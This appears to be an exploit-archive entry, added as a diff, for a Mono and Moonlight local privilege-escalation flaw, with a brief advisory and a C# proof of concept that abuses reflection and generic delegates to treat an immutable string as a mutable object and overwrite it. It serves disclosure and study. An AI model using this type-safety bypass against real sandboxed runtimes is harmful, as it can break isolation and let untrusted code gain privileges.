@@ -1,0 +1,44 @@
+Sources:  https://www.chrishowie.com/2010/11/24/mutable-strings-in-mono/
+http://www.securityfocus.com/bid/45051/info
+
+Mono and Moonlight is prone to a local privilege-escalation vulnerability.
+
+Local attackers can exploit this issue to execute arbitrary code with elevated privileges. Successful exploits will compromise the affected application and possibly the underlying computer. 
+
+PoC:
+
+using System;
+using System.Reflection;
+
+public class FakeString {
+    public int length;
+    public char start_char;
+}
+
+public class TestCase {
+    private static FakeString UnsafeConversion<T>(T thing)
+        where T : FakeString
+    {
+        return thing;
+    }
+
+    public static void Main() {
+        var a = "foo";
+        var b = MakeMutable(a);
+
+        Console.WriteLine(a);
+        b.start_char = 'b';
+        Console.WriteLine(a);
+    }
+
+    private static FakeString MakeMutable(string s)
+    {
+        var m = typeof(TestCase).GetMethod("UnsafeConversion", BindingFlags.NonPublic | BindingFlags.Static);
+        var m2 = m.MakeGenericMethod(typeof(string));
+
+        var d = (Func<string, FakeString>)Delegate.CreateDelegate(typeof(Func<string, FakeString>), null, m2);
+
+        return d(s);
+    }
+}
+
